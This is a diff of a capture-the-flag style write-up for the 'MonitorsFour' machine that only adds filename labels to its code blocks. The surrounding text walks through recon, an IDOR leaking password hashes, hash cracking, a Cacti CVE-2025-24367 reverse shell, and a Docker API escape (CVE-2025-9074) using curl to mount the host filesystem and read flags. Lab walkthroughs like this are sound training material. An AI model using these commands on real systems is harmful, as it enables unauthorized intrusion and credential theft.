@@ -36,6 +36,7 @@ PORT     STATE SERVICE REASON          VERSION
 |_http-title: Not Found
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
+{:filename="nmap.txt"}
 
 We only have 2 open ports which is rather interesting for a `windows` machine.
 1. `80 - http`
@@ -78,6 +79,7 @@ ________________________________________________
 cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 348ms]
 
 ```
+{:filename="vhosts.txt"}
 
 Let's add this to our `/etc/hosts` file and taking a look we're greeted with a `cacti` login for version `1.2.28`
 ![Cacti login](/assets/img/img_monitorsfour/monitorsfour-1765170625389.png)
@@ -115,6 +117,7 @@ views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 4
 controllers             [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 345ms]
 forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 402ms]
 ```
+{:filename="directories.txt"}
 
 ### Contact Page
 When visiting `contact` we get a `php` include error.
@@ -124,12 +127,14 @@ When visiting `contact` we get a `php` include error.
 <br />
 <b>Warning</b>:  include(): Failed opening '/var/www/app/views/contact.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/app/Router.php</b> on line <b>110</b><br />
 ```
+{:filename="contact.php"}
 
 ### User Page
 When visiting `user` we get a `Missing Token parameter` error.
 ```json
 {"error":"Missing token parameter"}
 ```
+{:filename="error.json"}
 
 Attempting to provide a `token` parameter leads to interesting results.
 ```json
@@ -137,6 +142,8 @@ http://monitorsfour.htb/user?token=0
 
 [{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b[REDACTED]","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
 ```
+{:filename="user.json"}
+
 # User
 ## Cacti Login
 Attempting to crack the password hashes we found on the user page we get a crack on one of the hashes.
@@ -145,6 +152,7 @@ hashcat -m 0 -a 0 passwords.txt /usr/share/wordlists/rockyou.txt.gz
 <SNIP>
 56b[REDACTED]:w[REDACTED]
 ```
+{:filename="hashcat.txt"}
 
 This was the password hash for the `admin` whose name happens to be `Marcus Higgins`. Let's generate a wordlist using `username anarchy`
 ```bash
@@ -165,6 +173,7 @@ higgins.m
 higgins.marcus
 mh
 ```
+{:filename="users.txt"}
 
 Fuzzing the logins we get a hit on the username `marcus`
 ```bash
@@ -196,6 +205,7 @@ ________________________________________________
 
 marcus                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 603ms]
 ```
+{:filename="userFuzz.txt"}
 
 We're able to login to `cacti`!
 ![Cacti logged in](/assets/img/img_monitorsfour/monitorsfour-1765171971837.png)
@@ -208,6 +218,7 @@ So let's start a `listener`
 rlwrap nc -lvnp 9001
 listening on [any] 9001 ...
 ```
+{:filename="listener.txt"}
 
 And let's run the exploit.
 ```bash
@@ -222,6 +233,7 @@ uv run --script exploit.py -u marcus -p $PASS -url http://cacti.monitorsfour.htb
 [+] Hit timeout, looks good for shell, check your listener!
 [+] Stopped HTTP server on port 80
 ```
+{:filename="CVE-2025-24367.sh"}
 
 Success! We get a callback on our listener.
 ```bash
@@ -232,6 +244,7 @@ www-data@821fbd6a43fa:~/html/cacti$
 www-data@821fbd6a43fa:~$ cat /home/marcus/user.txt
 b55[REDACTED]
 ```
+{:filename="revshell.txt"}
 
 Just like that, we have a user!
 # Root
@@ -264,6 +277,7 @@ total 3.8M
 4.0K drwxr-xr-x   1 root root 4.0K Nov  3 20:44 usr
 8.0K drwxr-xr-x   1 root root 4.0K Nov  4 04:06 var
 ```
+{:filename="www-data_directory_listing.txt"}
 
 Going back to the main website we're able to login using `admin` as a username and `marcus`' password.
 ![Admin dashboard](/assets/img/img_monitorsfour/monitorsfour-1765172728258.png)
@@ -276,6 +290,7 @@ That version of `docker` is vulnerable to [CVE-2025-9074](https://socprime.com/b
 www-data@821fbd6a43fa:~$ curl http://192.168.65.7:2375/containers/json
 [{"Id":"821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1","Names":["/web"],"Image":"docker_setup-nginx-php","ImageID":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ff7427b740fa0fbb79ed506e028edfed7263ffc3a0c666510c86706ad3690350","size":4281,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-php-entrypoint /start.sh","Created":1762794284,"Ports":[{"IP":"0.0.0.0","PrivatePort":80,"PublicPort":80,"Type":"tcp"},{"PrivatePort":9000,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"54a0d318f0f4ed9d35902f0c007a2bff60c5689a1c94f8ef7a94db7798386afd","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"mariadb:service_healthy:false","com.docker.compose.image":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/80/tcp":":80"},"State":"running","Status":"Up 12 hours","HostConfig":{"NetworkMode":"docker_setup_default"},"NetworkSettings":{"Networks":{"docker_setup_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"72:06:8c:11:54:de","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"dfd0743f496bfc071967ce317802f9c968025d98ac5f6d613c32d8fbf4a6e281","Gateway":"172.18.0.1","IPAddress":"172.18.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[]},{"Id":"c2bdd5d10cc52dc02e046bbedec91178cc2e6a12403e3323b7b120f7eb77c2b2","Names":["/mariadb"],"Image":"docker_setup-mariadb","ImageID":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ceab562c32247d164213f4df42a241a695ed1b2ae5a971f45791a3275635deee","size":2568,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-entrypoint.sh mariadbd","Created":1762794283,"Ports":[{"IP":"0.0.0.0","PrivatePort":3306,"PublicPort":3306,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"ae62dae65eee61960eb7c7a1b1b2cf918aaa7a689721404b85b492772d396eb0","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"","com.docker.compose.image":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/3306/tcp":":3306","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"State":"running","Status":"Up 12 hours (healthy)","HostConfig":{"NetworkMode":"docker_setup_default"},"NetworkSettings":{"Networks":{"docker_setup_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"2a:f4:68:da:56:0d","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"57a0392100f7c9c625ba30703ebcc94451f3b350c8884e6964a41f12bd66ef15","Gateway":"172.18.0.1","IPAddress":"172.18.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[{"Type":"volume","Name":"c037b802652b90f77688864756d7923900aaa2326ed97fe86213de892350e26c","Source":"","Destination":"/var/lib/mysql","Driver":"local","Mode":"","RW":true,"Propagation":""}]}]
 ```
+{:filename="dockerAPI.json"}
 
 ## Creating a container and running commands
 Success! We're able to identify all the containers. Let's create a container.
@@ -283,11 +298,13 @@ Success! We're able to identify all the containers. Let's create a container.
 www-data@821fbd6a43fa:~$ curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Cmd":["/bin/sh","-c","sleep 100000"],"Image":"alpine","HostConfig":{"Binds":["/:/w1ld"]},"NetworkMode":"host"}'
 {"Id":"22b87a688156dacbeb35d2e144662dc31a13bbd01de6af6af9af539d70877d38","Warnings":[]}
 ```
+{:filename="dockerAPI.json"}
 
 We get no warnings, let's start the container.
 ```bash
 www-data@821fbd6a43fa:~$ curl -X POST http://192.168.65.7:2375/containers/22b87a688156dacbeb35d2e144662dc31a13bbd01de6af6af9af539d70877d38/start
 ```
+{:filename="dockerAPI.json"}
 
 Now let's create an exec and start it.
 ```bash
@@ -332,6 +349,7 @@ total 41M
       0 drwxr-xr-x    1 root     root          60 Aug 12 07:40 usr
       0 drwxr-xr-x   11 root     root         240 Dec  7 18:07 var
 ```
+{:filename="dockerAPI.json"}
 
 Success! We're able to run code on our new container. and check our `w1ld` directory. The `C` directory for the `windows` machine will probably be in `/mnt/host/c` given that it's `Docker Desktop`. Let's take a look.
 ```bash
@@ -355,6 +373,7 @@ www-data@821fbd6a43fa:~$ curl -X POST http://192.168.65.7:2375/exec/$EXEC/start 
       0 drwxrwxrwx    1 root     root        4.0K Mar 24  2025 Windows.old
       0 drwxrwxrwx    1 root     root        4.0K Nov 11 17:20 inetpub
 ```
+{:filename="dockerAPI.json"}
 
 We can now grab the `root` flag.
 ```bash
@@ -364,5 +383,6 @@ www-data@821fbd6a43fa:~$ export EXEC=08f81b2dc928d19e04bd04036d5db6d4043c9a2ce8b
 www-data@821fbd6a43fa:~$ curl -X POST http://192.168.65.7:2375/exec/$EXEC/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}'
 1f4[Redacted]
 ```
+{:filename="dockerAPI.json"}
 
 Just like that, we have Root!
